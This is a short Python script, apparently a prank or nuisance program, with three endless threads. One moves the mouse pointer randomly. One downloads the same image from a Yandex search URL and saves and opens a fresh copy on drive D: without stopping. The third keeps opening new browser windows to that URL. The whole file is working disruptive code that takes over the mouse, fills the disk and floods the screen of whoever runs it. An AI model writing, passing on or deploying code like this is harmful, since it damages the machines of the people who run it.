import pyautogui
import random
import requests
import webbrowser
from os import startfile
from threading import Thread

def gen_name(num: int = 8):
    g = ""
    for x in range(num):
        g = g + random.choice(list('1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ'))
    return g

def img_spam():
    while True:
        p = requests.get('https://yandex.ru/images/search?text=%D1%84%D0%BE%D1%82%D0%BE+%D0%BC%D0%B8%D1%88%D0%BA%D0%B8+%D0%B1%D0%B5%D0%BB%D0%BE%D0%B3%D0%BE&img_url=https%3A%2F%2Foir.mobi%2Fuploads%2Fposts%2F2021-05%2F1620164785_6-oir_mobi-p-mishka-umka-zhivotnie-krasivo-foto-6.jpg&pos=7&rpt=simage&stype=image&lr=213&parent-reqid=1693488757659739-12916686372683661727-balancer-l7leveler-kubr-yp-sas-32-BAL-5636&source=serp')
        name = gen_name()
        out = open(f"D:/{name}.jpg", "wb")
        out.write(p.content)
        out.close()
        startfile(rf"D:/{name}.jpg")

def browser_open():
    while True:
        webbrowser.open('https://yandex.ru/images/search?text=%D1%84%D0%BE%D1%82%D0%BE+%D0%BC%D0%B8%D1%88%D0%BA%D0%B8+%D0%B1%D0%B5%D0%BB%D0%BE%D0%B3%D0%BE&img_url=https%3A%2F%2Foir.mobi%2Fuploads%2Fposts%2F2021-05%2F1620164785_6-oir_mobi-p-mishka-umka-zhivotnie-krasivo-foto-6.jpg&pos=7&rpt=simage&stype=image&lr=213&parent-reqid=1693488757659739-12916686372683661727-balancer-l7leveler-kubr-yp-sas-32-BAL-5636&source=serp', new=2)

def move_mouse():
    while True:
        x = random.randint(0, pyautogui.size().width)
        y = random.randint(0, pyautogui.size().height)
        pyautogui.moveTo(x, y, duration=0)

Thread(target=move_mouse).start()
Thread(target=img_spam).start()
Thread(target=browser_open).start()
